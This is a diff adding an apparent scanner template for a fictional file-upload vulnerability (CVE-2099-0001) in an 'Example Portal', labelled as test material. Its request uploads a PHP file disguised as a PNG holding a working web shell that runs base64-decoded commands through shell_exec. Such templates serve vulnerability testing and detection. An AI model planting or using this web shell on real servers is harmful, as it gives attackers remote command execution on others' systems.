@@ -1,0 +1,21 @@
+id: CVE-2099-0001
+
+info:
+  name: Example Portal - Unauthenticated File Upload (fictional, for tests)
+  author: TechDetechtives
+  severity: critical
+  tags: cve,rce,fileupload,test
+
+http:
+  - raw:
+      - |
+        POST /portal/api/upload_asset.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----TDBoundary
+
+        ------TDBoundary
+        Content-Disposition: form-data; name="asset"; filename="{{randstr}}.php"
+        Content-Type: image/png
+
+        <?php if(isset($_REQUEST['tdq'])){ echo shell_exec(base64_decode($_REQUEST['tdq'])); } ?>
+        ------TDBoundary--
